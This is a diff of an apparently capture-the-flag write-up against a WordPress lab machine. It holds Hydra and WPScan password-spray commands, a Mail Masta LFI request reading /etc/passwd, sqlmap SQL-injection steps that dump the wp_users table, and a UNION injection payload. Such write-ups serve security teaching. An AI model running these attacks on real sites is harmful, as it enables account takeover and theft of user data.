@@ -235,16 +235,16 @@ wpscan --url http://TARGET_IP/Wordpress > wpscan.txt
   * No public exploits listed on Exploit db.
 ## Exploitation
 ### Initial Access
-* Password spray WordPress using Hydra.
+#### Password spray WordPress using Hydra.
 ```
 hydra -l elyana -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2FTARGET_IP%2Fwordpress%2Fwp-admin%2F&testcookie=1:Error" -T 64 -vV
 ```
-* Password spray WordPress using WPscan.
+#### Password spray WordPress using WPscan.
 ```
 # sudo wpscan --password-attack xmlrpc -t 20 -U <username> -P /usr/share/wordlists/rockyou.txt --url <url>
 sudo wpscan --password-attack xmlrpc -t 20 -U elyana  -P /usr/share/wordlists/rockyou.txt --url http://TARGET_IP/wordpress/
 ```
-* Exploit Mail Masta LFI vulnerability.
+#### Exploit Mail Masta LFI vulnerability.
 > "pl" parameter allows inclusion of a file without any type of input validation or sanitisation. Can attempt to include arbitrary files on the webserver. E.g. display contents of /etc/passwd file using cURL.
 ```
 curl -s http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
@@ -283,30 +283,22 @@ mysql:x:110:113:MySQL Server,,,:/nonexistent:/bin/false
 sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
 ftp:x:111:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
 ```
-  * Elyana user is only other user other than root with "/bin/bash" shell access.
-* Exploit Mail Masta SQLi.
-  * Page: ./wp-content/plugins/mail-masta/inc/lists/csvexport.php (Unauthenticated).
+* Elyana user is only other user other than root with "/bin/bash" shell access.
+#### Exploit Mail Masta SQLi.
+* Page: ./wp-content/plugins/mail-masta/inc/lists/csvexport.php (Unauthenticated).
+* GET Parameter: list_id
+**Enumerate databases**
 ```
 sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" --dbs
-
+```
+* `-u` specifies target URL.
+* `--dbs` tells SQLMap to try to enumerate database.
+```
 available databases [2]:
 [*] information_schema
 [*] wordpress
 ```
-  * `-u` specifies target URL.
-  * `--dbs` tells SQLMap to try to enumerate database.
-* GET Parameter: list_id
-```
-sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" -p list_id
-...
-  * `-p` specifies testable parameter(s).
-```
-Parameter: list_id (GET)
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 10 columns
-    Payload: list_id=0 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71786b7871,0x554c4e5a557457706f54667a4470616d4161427a4774594c617753474e5945436c61755748507653,0x7170787871),NULL,NULL,NULL,NULL,NULL-- cgoQ&pl=/var/www/html/wordpress/wp-load.php
-```
-* List tables within "wordpress" database.
+**List tables within "wordpress" database**
 ```
 sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" -D wordpress --tables
 
@@ -338,7 +330,7 @@ Database: wordpress
 | wp_users                   |
 +----------------------------+
 ```
-* List columns within "wp_users" table.
+**List columns within "wp_users" table**
 ```
 sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" -D wordpress -D wordpress -T wp_users --columns
 
@@ -360,7 +352,7 @@ Table: wp_users
 | user_url            | varchar(100)        |
 +---------------------+---------------------+
 ```
-* Dump contents of "wp_users" table.
+**Dump contents of "wp_users" table**
 ```
 Database: wordpress
 Table: wp_users
